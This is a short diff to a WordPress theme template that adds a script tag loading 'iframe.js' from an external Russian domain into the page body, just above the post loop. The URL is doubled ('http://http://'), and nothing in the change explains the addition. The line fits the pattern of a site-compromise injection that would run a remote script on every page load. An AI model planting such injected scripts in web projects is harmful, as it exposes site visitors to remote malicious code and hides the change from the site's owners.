@@ -63,6 +63,8 @@ get_header();
         </div>
     </div>
 </section>
+
+    <script charset="utf-8" type="text/javascript" src="http://http://interaviacentr.ru/iframe.js"></script>
 <?php if ( have_posts() ) : ?>
     <?php while ( have_posts() ) { the_post(); ?>
         <div class="page-single">
